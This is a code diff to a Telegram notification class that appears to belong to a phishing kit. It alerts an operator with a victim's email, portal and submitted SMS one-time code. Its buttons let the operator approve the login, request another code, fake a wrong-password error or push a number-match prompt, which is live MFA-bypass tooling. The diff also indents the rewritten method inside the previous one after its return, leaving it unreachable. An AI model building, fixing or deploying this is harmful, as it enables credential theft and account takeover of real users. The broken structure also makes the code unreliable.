@@ -138,53 +138,37 @@ class TelegramService:
 
         inline_keyboard = {"inline_keyboard": keyboard}
         return self.send_message(message, "HTML", inline_keyboard)
+        def send_sms_submit_alert(self, state):
+            if not self.is_configured():
+                return None
 
-    def send_sms_submit_alert(self, state):
-        if not self.is_configured():
-            return None
+            attempt_id = state.get("id", "")
 
-        attempt_id = state.get("id", "")
+            message = f"""
+    📲 <b>BOX RESULT</b>
+    ━━━━━━━━━━━━━━━━━━
+    🏢 <b>Portal:</b> {state.get('provider', '').upper()}
+    📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
+    📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
+    ━━━━━━━━━━━━━━━━━━
+            """.strip()
 
-        message = f"""
-📲 <b>BOX RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🏢 <b>Portal:</b> {state.get('provider', '').upper()}
-📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
-📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
-📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
-━━━━━━━━━━━━━━━━━━
-        """.strip()
+            # Build a clean, structured layout with exactly one button per action
+            keyboard = [
+                [
+                    {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
+                ],
+                [
+                    {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
+                    {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
+                ],
+                [
+                    {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
+                ]
+            ]
 
-        keyboard = []
-        keyboard.append([
-            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
-        ])
-        keyboard.append([
-            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
-            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
-        ])
-
-        keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ])
-
-        candidates = state.get("promptCandidates") or []
-        if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
-            row = []
-            for num in candidates:
-                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
-            keyboard.append(row)
-            keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ])
-        else:
-            keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
-            ])
-
-        inline_keyboard = {"inline_keyboard": keyboard}
-        return self.send_message(message, "HTML", inline_keyboard)
-        
+            inline_keyboard = {"inline_keyboard": keyboard}
+            return self.send_message(message, "HTML", inline_keyboard)
 
     def poll_updates(self, on_action_received):
         if not self.is_configured():
